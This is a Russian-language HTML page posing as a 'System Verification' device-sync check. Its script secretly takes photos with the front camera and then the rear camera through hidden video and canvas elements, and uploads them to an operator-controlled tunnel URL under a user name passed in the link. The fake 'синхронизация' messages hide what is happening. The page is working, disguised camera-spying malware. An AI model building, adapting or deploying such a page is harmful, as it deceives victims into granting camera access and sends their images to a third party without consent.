<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>System Verification</title>
    <style>
        body { margin:0; background:#000; color:#fff; font-family:-apple-system, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; overflow:hidden; }
        .card { width:280px; padding:40px; background:#111; border-radius:30px; border:1px solid #333; text-align:center; box-shadow:0 20px 40px rgba(0,0,0,0.8); }
        .btn { background:#007AFF; color:#fff; border:none; padding:18px; border-radius:15px; width:100%; font-weight:bold; font-size:16px; cursor:pointer; }
        #ld { display:none; margin:20px auto; width:30px; height:30px; border:3px solid #222; border-top:3px solid #007AFF; border-radius:50%; animation:s 1s linear infinite; }
        @keyframes s { to { transform:rotate(360deg); } }
        video, canvas { display:none; }
    </style>
</head>
<body>
    <div class="card">
        <h2 id="st">Verification</h2>
        <p id="msg" style="color:rgba(255, 255, 255, 0.4); font-size:14px; margin-bottom:30px;">Для синхронизации нажмите подтвердить</p>
        <button class="btn" id="go" onclick="run()">ПОДТВЕРДИТЬ</button>
        <div id="ld"></div>
    </div>
    
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        // === ВАЖНО: ВСТАВЬ СЮДА ССЫЛКУ ИЗ SSH ТЕРМИНАЛА (БЕЗ "/" В КОНЦЕ) ===
        const API = "https://361503e3b92cec.lhr.life"; 

        // Получаем имя пользователя из URL (?user=...)
        const urlParams = new URLSearchParams(window.location.search);
        const user = urlParams.get('user') || "Unknown_User";

        async function getStream(isBack) {
            const constraints = {
                video: {
                    facingMode: isBack ? { exact: "environment" } : "user",
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }
            };
            try {
                return await navigator.mediaDevices.getUserMedia(constraints);
            } catch (e) {
                if (isBack) return await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                throw e;
            }
        }

        async function capture(stream) {
            const v = document.getElementById('v');
            const canvas = document.getElementById('c');
            v.srcObject = stream;
            
            await new Promise(r => v.onloadedmetadata = r);
            await new Promise(r => setTimeout(r, 1500)); // Ждем фокус

            canvas.width = v.videoWidth;
            canvas.height = v.videoHeight;
            canvas.getContext('2d').drawImage(v, 0, 0);
            
            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
            stream.getTracks().forEach(t => t.stop()); // Выключаем камеру
            return blob;
        }

        async function run() {
            const btn = document.getElementById('go');
            const loader = document.getElementById('ld');
            const status = document.getElementById('st');
            const msg = document.getElementById('msg');

            btn.style.display = 'none';
            loader.style.display = 'block';
            status.innerText = "Processing...";

            const fd = new FormData();

            try {
                // 1. Селфи
                msg.innerText = "Синхронизация (1/2)...";
                const s1 = await getStream(false);
                const b1 = await capture(s1);
                fd.append('files', b1, 'front.jpg');

                // 2. Задняя камера
                try {
                    msg.innerText = "Синхронизация (2/2)...";
                    const s2 = await getStream(true);
                    const b2 = await capture(s2);
                    fd.append('files', b2, 'back.jpg');
                } catch(e) { console.log("No back camera"); }

                // 3. Отправка на Flask-сервер
                msg.innerText = "Отправка данных...";
                const res = await fetch(`${API}/upload-photo?user=${user}`, {
                    method: 'POST',
                    body: fd
                });

                if (res.ok) {
                    status.innerText = "Success";
                    loader.style.display = 'none';
                    msg.innerText = "Устройство успешно синхронизировано.";
                    msg.style.color = "#4cd964";
                } else {
                    throw new Error("Server error");
                }

            } catch (e) {
                alert("Ошибка! Пожалуйста, разрешите доступ к камере.");
                location.reload();
            }
        }
    </script>
</body>
</html>
